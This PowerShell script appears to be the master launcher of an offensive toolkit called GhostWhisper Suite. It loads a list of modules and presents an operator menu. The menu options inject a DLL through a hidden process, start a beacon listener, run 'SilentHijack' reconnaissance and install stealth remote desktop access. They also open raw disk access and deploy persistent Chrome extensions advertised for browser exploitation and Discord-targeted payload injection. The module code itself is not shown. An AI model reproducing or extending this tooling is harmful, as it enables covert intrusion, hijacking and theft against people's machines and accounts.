# GhostWhisperBootstrap.ps1
# Master launcher for GhostWhisper Suite (Raven Edition), with full module list and LinuxPDF VM integration

Write-Host "[🕊️] Initializing GhostWhisper Bootstrap..."

# 1. Verify admin privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Admin rights required. Relaunch as Administrator."
    exit
}

# 2. Load Modules
$modules = @(
    "Modules\GhostResidency.ps1",
    "Modules\ExorcistMode.ps1",
    "Modules\GhostLogger.ps1",
    "Modules\AnomalyHunter.ps1",
    "Modules\Anomaly_Detector.ps1",
    "Modules\GhostSeal.ps1",
    "Modules\Phase_Anoint.ps1",
    "Modules\Phase_Bind.ps1",
    "Modules\Phase_Cleanse.ps1",
    "Modules\LinuxPDF_Emu.ps1",
    "Modules\LinuxPDF_Runtime.ps1",
    "Modules\Wormhole.ps1",
    "Modules\Phantom.ps1", # <-- Combined SearchPhantom + PrismGhost
    "Modules\GhostDesktop.ps1", # <-- Stealth Chrome RDP module
    "Modules\GhostKernel.ps1", # <-- Linux kernel module interface
    "Modules\GhostBrowser.ps1" # <-- Chrome extension deployment
)

foreach ($mod in $modules) {
    $modPath = Join-Path $PSScriptRoot $mod
    if (Test-Path $modPath) {
        . $modPath
        Write-Host "[+] Loaded: $mod"
    }
    else {
        Write-Warning "[-] Missing module: $modPath"
    }
}

# 3. Run Anomaly Detection (if available)
Write-Host "[*] Running environment safety scan (AnomalyHunter + Detector)..."
if (Get-Command -Name Start-AnomalyHunt -ErrorAction SilentlyContinue) {
    Start-AnomalyHunt -Path "$env:SystemDrive\" -Log
}
else {
    Write-Warning "Function 'Start-AnomalyHunt' not found. Skipping anomaly scan."
}

if (Get-Command -Name Invoke-AnomalyDetector -ErrorAction SilentlyContinue) {
    Invoke-AnomalyDetector -Scope "SystemDrive"
}
else {
    Write-Warning "Function 'Invoke-AnomalyDetector' not found. Skipping additional detection."
}

# 4. Operator Menu
function Show-OperatorMenu {
    Write-Host ""
    Write-Host "GhostWhisper Operator Menu:"
    Write-Host "[1] Start Recon Session (GhostResidency)"
    Write-Host "[2] Run ExorcistMode Cleanup"
    Write-Host "[3] Deploy GhostKey & WraithTap"
    Write-Host "[4] Activate Wormhole Listener"
    Write-Host "[5] Run GhostLinux VM (via LinuxPDF.exe + ghost_boot.iso)"
    Write-Host "[6] Exit"
    Write-Host "[7] Deploy Phantom Recon Stack (SearchPhantom + PrismGhost)"
    Write-Host "[8] Install Stealth Desktop Access (Chrome RDP)"
    Write-Host "[9] Deploy GhostKernel (Linux Disk Access)"
    Write-Host "[10] Deploy GhostBrowser (Chrome Extension)"
    Write-Host ""
}

while ($true) {
    Show-OperatorMenu
    $choice = Read-Host "Choose action"

    switch ($choice) {
        "1" {
            Write-Host "[🧠] GhostResidency engagement starting..."
            if (Get-Command -Name Start-GhostResidency -ErrorAction SilentlyContinue) {
                Start-GhostResidency -Mode "Recon"
            }
            else {
                Write-Warning "Start-GhostResidency function missing."
            }
        }
        "2" {
            $scanPath = Read-Host "Enter path to scan (default: TEMP)"
            if (-not $scanPath) { $scanPath = $env:TEMP }
            if (Get-Command -Name Start-Exorcism -ErrorAction SilentlyContinue) {
                Start-Exorcism -Path $scanPath -Log
            }
            else {
                Write-Warning "Start-Exorcism function missing."
            }
        }
        "3" {
            Write-Host "[🔐] Injecting GhostKey..."
            $ghostDll = Join-Path $PSScriptRoot "GhostKey.dll"
            $wraithTap = Join-Path $PSScriptRoot "WraithTap.exe"
            if (-not (Test-Path $ghostDll) -or -not (Test-Path $wraithTap)) {
                Write-Warning "Missing WraithTap or GhostKey. Please compile first."
            }
            else {
                Start-Process -WindowStyle Hidden -FilePath $wraithTap -ArgumentList $ghostDll
            }
        }
        "4" {
            Write-Host "[📡] Activating wormhole beacon..."
            if (Get-Command -Name Start-WormholeListener -ErrorAction SilentlyContinue) {
                Start-WormholeListener
            }
            else {
                Write-Warning "Function 'Start-WormholeListener' missing from Wormhole module."
            }
        }
        "5" {
            Write-Host "[🔥] Launching GhostLinux VM environment..."
            $linuxPdfExe = Join-Path $PSScriptRoot "LinuxPDF.exe"
            $isoPath = Join-Path $PSScriptRoot "ghost_boot.iso"

            if (-not (Test-Path $linuxPdfExe)) {
                Write-Warning "LinuxPDF.exe not found. Please build/publish it."
                break
            }
            if (-not (Test-Path $isoPath)) {
                Write-Warning "ghost_boot.iso not found. Please run CreateGhostISO.ps1 or place it here."
                break
            }

            $args = "--boot=""$isoPath"""
            Write-Host "Running: $linuxPdfExe $args"
            Start-Process -FilePath $linuxPdfExe -ArgumentList $args
        }
        "6" {
            Write-Host "[✖] Exiting. Ghost sleeps."
            break
        }
        "7" {
            Write-Host "[👻] Launching Phantom Recon Module..."
            if (Get-Command -Name Start-PhantomRecon -ErrorAction SilentlyContinue) {
                 $logPath = Join-Path $PSScriptRoot "Logs\Phantom.log"
                if (-not (Test-Path "$PSScriptRoot\Logs")) {
                    New-Item -ItemType Directory -Path "$PSScriptRoot\Logs" | Out-Null
                }
                Start-PhantomRecon -Mode "SilentHijack" -LogPath $logPath
            }
            else {
                Write-Warning "Start-PhantomRecon function not found. Ensure Phantom.ps1 is correctly placed."
            }
        }
        "8" {
            Write-Host "[🖥️] Installing stealth desktop access..."
            $ghostTag = Read-Host "Enter Ghost Tag (default: Gx01)"
            if (-not $ghostTag) { $ghostTag = "Gx01" }
            
            if (Get-Command -Name Install-GhostDesktop -ErrorAction SilentlyContinue) {
                $result = Install-GhostDesktop -GhostTag $ghostTag -Silent
                if ($result) {
                    Write-Host "[+] Desktop access installed successfully"
                    Write-Host "[i] Use Chrome Remote Desktop or RDP to connect"
                } else {
                    Write-Warning "Desktop installation failed. Check logs."
                }
            }
            else {
                Write-Warning "Install-GhostDesktop function not found. Ensure GhostDesktop.ps1 is loaded."
            }
        }
        "9" {
            Write-Host "[🔮] Deploying GhostKernel module..."
            $ghostTag = Read-Host "Enter Ghost Tag (default: Gx01)"
            if (-not $ghostTag) { $ghostTag = "Gx01" }
            
            $targetDevice = Read-Host "Enter target device (default: /dev/sdb)"
            if (-not $targetDevice) { $targetDevice = "/dev/sdb" }
            
            if (Get-Command -Name Start-GhostKernelSession -ErrorAction SilentlyContinue) {
                $result = Start-GhostKernelSession -TargetDevice $targetDevice -GhostTag $ghostTag
                if ($result) {
                    Write-Host "[+] GhostKernel session active"
                    Write-Host "[i] Use PowerShell commands to interact with kernel module"
                    Write-Host "[i] Example: Read-GhostKernelSector -Sector 0"
                } else {
                    Write-Warning "GhostKernel deployment failed. Check logs."
                }
            }
            else {
                Write-Warning "Start-GhostKernelSession function not found. Ensure GhostKernel.ps1 is loaded."
            }
        }
        "10" {
            Write-Host "[🌐] Deploying GhostBrowser extension..."
            $ghostTag = Read-Host "Enter Ghost Tag (default: Gx01)"
            if (-not $ghostTag) { $ghostTag = "Gx01" }
            
            Write-Host "[*] Available extension types:"
            Write-Host "    [1] GhostCore - General purpose browser exploitation"
            Write-Host "    [2] Discord - Discord-targeted payload injection"
            Write-Host "    [3] GhostSurface - Advanced memory manipulation"
            
            $extChoice = Read-Host "Select extension type (1-3)"
            $extType = switch ($extChoice) {
                "1" { "ghostcore" }
                "2" { "discord" }
                "3" { "ghostsurface" }
                default { "ghostcore" }
            }
            
            $persistent = Read-Host "Install persistently? (y/N)"
            $persistentFlag = ($persistent -eq "y" -or $persistent -eq "Y")
            
            if (Get-Command -Name Install-GhostBrowserExtension -ErrorAction SilentlyContinue) {
                $result = Install-GhostBrowserExtension -ExtensionType $extType -GhostTag $ghostTag -Persistent:$persistentFlag
                if ($result) {
                    Write-Host "[+] Browser extension deployed successfully"
                    Write-Host "[i] Chrome will launch with the extension loaded"
                    Write-Host "[i] Extension provides memory exploitation and system access"
                    
                    # Optionally build native messaging host
                    $buildHost = Read-Host "Build native messaging host for system access? (y/N)"
                    if ($buildHost -eq "y" -or $buildHost -eq "Y") {
                        if (Get-Command -Name Build-NativeMessagingHost -ErrorAction SilentlyContinue) {
                            Build-NativeMessagingHost -GhostTag $ghostTag
                        }
                    }
                } else {
                    Write-Warning "Browser extension deployment failed. Check logs."
                }
            }
            else {
                Write-Warning "Install-GhostBrowserExtension function not found. Ensure GhostBrowser.ps1 is loaded."
            }
        }
        default {
            Write-Warning "Invalid selection. Try again."
        }
    }
}

Write-Host "[~] GhostWhisperBootstrap session ended."